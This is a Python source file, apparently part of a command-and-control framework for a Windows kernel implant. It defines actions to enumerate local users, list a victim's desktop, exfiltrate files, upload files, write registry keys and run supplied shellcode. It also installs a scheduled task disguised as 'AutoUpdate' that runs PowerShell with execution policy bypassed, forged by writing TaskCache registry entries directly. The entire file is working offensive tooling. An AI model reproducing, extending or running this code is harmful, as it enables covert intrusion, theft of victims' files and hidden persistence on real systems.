import os
from c2.c2_actions import C2Action
import c2.concrete_parsers as c2parsers


def find_local_users():
    commands_list = ["dir \\??\\C:\\Users\\"]
    parser = c2parsers.local_users_parser
    required_facts = []
    name = "Find local users"
    description = "Get a list of non-default local users"
    output_facts = ['local_users', 'target_local_user']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def list_target_local_user_desktop():
    commands_list = ["dir \\??\\C:\\Users\\{target_local_user}\\Desktop\\"]
    parser = c2parsers.generic_dir_parser
    required_facts = ['target_local_user']
    name = "List user desktop"
    description = "Find potentially sensitive files on target user's desktop"
    output_facts = ['staged_files', 'target_file']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_file():
    commands_list = ["read {target_file}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['target_file']
    name = "Exfiltrate file"
    description = "Read a file from the victim's file system"
    output_facts = ['exfiltrated_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_staged_files():
    commands_list = ["read {staged_files}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['staged_files']
    name = "Exfiltrate a list of staged files"
    description = "Read a list of files from the victim's file system; it is an iterative action"
    output_facts = ['exfiltrated_files']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    action.iterativeAction()
    return action


def get_system_version():
    commands_list = ["version"]
    parser = c2parsers.version_parser
    required_facts = []
    name = "Get system version"
    description = "Get major version, minor version and build number"
    output_facts = ['major_version', 'minor_version', 'build_number']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def write_file(filename=None, target_file=None):
    commands_list = [f"write {target_file}" if target_file is not None else "write {target_file}"]
    if filename is None:
        commands_list.append(b"stub")
    else:
        filename = filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        chunk_size = 1460
        data = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
        for chunk in data:
            commands_list.append(chunk)
    parser = c2parsers.null_parser
    if target_file is None:
        required_facts = ['target_file']
    else:
        required_facts = []
    name = "Write file on remote file system"
    description = "This action reads a file, specified as argument, from the upload_dir, " \
                  "and writes it to remote file system in the path specified by target_file; " \
                  "if the local file is not specified, the action will write 'stub'"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def set_registry_key(key=None, subkey_name=None, subkey_type=None, subkey_value=None):
    args = [key, subkey_name, subkey_type, subkey_value]
    commands_list = [f"setkey {key}" if key is not None else "setkey {reg_key}",
                     subkey_name or "{reg_subkey_name}",
                     subkey_type or "{reg_subkey_type}",
                     subkey_value or "{reg_subkey_value}"]
    parser = c2parsers.null_parser
    complete_required_facts = ['reg_key', 'reg_subkey_name', 'reg_subkey_type', 'reg_subkey_value']
    required_facts = [complete_required_facts[i] for i in range(len(args)) if args[i] is None]
    name = "Set subkey name, type and value in a registry key"
    description = "Open/create a key in the Windows registry, and for that key sets a " \
                  "subkey with specified name, type and value; you can either start this action" \
                  " using facts or passing positional parameters: " \
                  "key_name subkey_name subkey_type subkey_value"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def run_user_mode_shellcode(shellcode_filename=None):
    if shellcode_filename is None:
        commands_list = ["usermode <shellcode_bytes>"]
    else:
        filename = shellcode_filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        data = data[:1451]
        commands_list = [b"usermode " + data]
    parser = c2parsers.null_parser
    required_facts = []
    name = "Run user-mode shellcode"
    description = "Make the kernel agent allocate a kernel thread, which in turn makes a transition to " \
                  "user-mode, executing the user-level shellcode provided as input; this action takes " \
                  "as positional parameter the name of a file in the upload_dir folder"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def install_schtask():
    commands_list = []
    parser = c2parsers.null_parser
    required_facts = []
    name = "Install a scheduled task on the remote Windows target"
    schtask_cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' \
                       ' -ExecutionPolicy Bypass -Command "& \'C:\\Windows\\System32\\update.ps1\'"'
    # TODO: describe trigger in description
    description = "The scheduled task installed executes the following command line:\n" + \
                  schtask_cmd_line
    # TODO: random generate the hard-coded task id
    # TODO: make the task name parametric
    # TODO: compute the task hash according to values (it is sha256(xml_file[2:]) )
    # TODO: task_date at run-time
    # TODO: set SYSTEM as task_author in the proper way
    # TODO: customize task_triggers, if needed
    # TODO: is DynamicInfo needed or not for the trigger to work properly?
    # TODO: is it needed to write the XML file in C:\\Windows\\System32\\Tasks ?
    security_descriptor = b'\x01\x00\x04\x80\x78\x00\x00\x00\x88\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x64\x00\x04\x00\x00\x00\x00\x10\x18\x00\x9f\x01\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x00\x10\x14\x00\x9f\x01\x1f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x10\x18\x00\xff\x01\x1f\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x00\x00\x14\x00\x89\x00\x12\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xa0\xda\x06\x43\x75\x7d\x9d\x47\xd6\x2d\x25\x3a\x01\x02\x00\x00'
    task_id = "{5425CA0C-6B59-4BA8-ABB0-B84A4C4E22D9}"
    task_name = "\\AutoUpdate"   # trailing slash needed
    task_hash = b'\xb8\xd8\x98\x64\x34\x2e\xc9\x36\x39\x24\x08\xac\xf4\x24\x67\xee\x7e\x00\xff\xb2\x8a\x0a\x6d\x06\x2d\x15\x3f\xc1\xa2\x19\xcd\xf9'
    # task_date = "2022-09-16T15:41:23.4981941"
    # task_author = "WIN10\\admin"
    # task_description = "Default Windows System Update"
    task_triggers = b'\x17\x00\x00\x00\x00\x00\x00\x00\x00\xd9\xcf\x47\xc5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\xcf\x47\xc5\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x78\x05\x41\x43\x48\x48\x48\x48\x52\x84\xda\x83\x48\x48\x48\x48\x0e\x00\x00\x00\x48\x48\x48\x48\x41\x00\x75\x00\x74\x00\x68\x00\x6f\x00\x72\x00\x00\x00\x48\x48\x00\x00\x00\x00\x48\x48\x48\x48\x00\x48\x48\x48\x48\x48\x48\x48\x00\x48\x48\x48\x48\x48\x48\x48\x01\x00\x00\x00\x48\x48\x48\x48\x1c\x00\x00\x00\x48\x48\x48\x48\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xa0\xda\x06\x43\x75\x7d\x9d\x47\xd6\x2d\x25\x3a\xe8\x03\x00\x00\x48\x48\x48\x48\x18\x00\x00\x00\x48\x48\x48\x48\x57\x00\x49\x00\x4e\x00\x31\x00\x30\x00\x5c\x00\x61\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x00\x00\x2c\x00\x00\x00\x48\x48\x48\x48\x00\x00\x00\x00\xff\xff\xff\xff\x80\xf4\x03\x00\xff\xff\xff\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x48\x48\x48\x88\x88\x00\x00\x00\x00\x00\x00\x00\xd9\xcf\x47\xc5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\xcf\x47\xc5\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x48\x48\x48'
    task_actions = b'\x03\x00\x0c\x00\x00\x00\x41\x00\x75\x00\x74\x00\x68\x00\x6f\x00\x72\x00\x66\x66\x00\x00\x00\x00\x72\x00\x00\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x50\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x53\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x5c\x00\x76\x00\x31\x00\x2e\x00\x30\x00\x5c\x00\x70\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x73\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x8a\x00\x00\x00\x2d\x00\x45\x00\x78\x00\x65\x00\x63\x00\x75\x00\x74\x00\x69\x00\x6f\x00\x6e\x00\x50\x00\x6f\x00\x6c\x00\x69\x00\x63\x00\x79\x00\x20\x00\x42\x00\x79\x00\x70\x00\x61\x00\x73\x00\x73\x00\x20\x00\x2d\x00\x43\x00\x6f\x00\x6d\x00\x6d\x00\x61\x00\x6e\x00\x64\x00\x20\x00\x22\x00\x26\x00\x20\x00\x27\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x75\x00\x70\x00\x64\x00\x61\x00\x74\x00\x65\x00\x2e\x00\x70\x00\x73\x00\x31\x00\x27\x00\x22\x00\x00\x00\x00\x00\x00\x00'
    # task_dynamic_info = b'\x03\x00\x00\x00\x9c\xd9\xe3\x02\xd2\xc9\xd8\x01\x34\xe4\xe9\x02\xd2\xc9\xd8\x01\x00\x00\x00\x00\x00\x00\x00\x00\x79\xa4\x29\x05\xd2\xc9\xd8\x01'
    reg_task_index = "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT" \
                     "\\CurrentVersion\\Schedule\\TaskCache\\Tree" + task_name
    reg_task_data = "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT" \
                    "\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\" + task_id
    sub_action = set_registry_key(reg_task_index, "Id", "REG_SZ", task_id)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_index, "Index", "REG_DWORD", "3")
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_index, "SD", "REG_BINARY", security_descriptor)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Path", "REG_SZ", task_name)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Hash", "REG_BINARY", task_hash)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Schema", "REG_DWORD", "65540")    # 0x10004
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Version", "REG_SZ", "1.0")
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "Date", "REG_SZ", task_date)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Author", "REG_SZ", task_author)
    commands_list += sub_action.commandsList
    
    sub_action = set_registry_key(reg_task_data, "Description", "REG_SZ", task_description)
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "URI", "REG_SZ", task_name)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Triggers", "REG_BINARY", task_triggers)
    commands_list += sub_action.commandsList
    sub_action = set_registry_key(reg_task_data, "Actions", "REG_BINARY", task_actions)
    commands_list += sub_action.commandsList
    """
    sub_action = set_registry_key(reg_task_data, "DynamicInfo", "REG_BINARY", task_dynamic_info)
    commands_list += sub_action.commandsList
    """
    sub_action = write_file("schtask.xml", "\\??\\C:\\Windows\\System32\\Tasks" + task_name)
    commands_list += sub_action.commandsList
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action
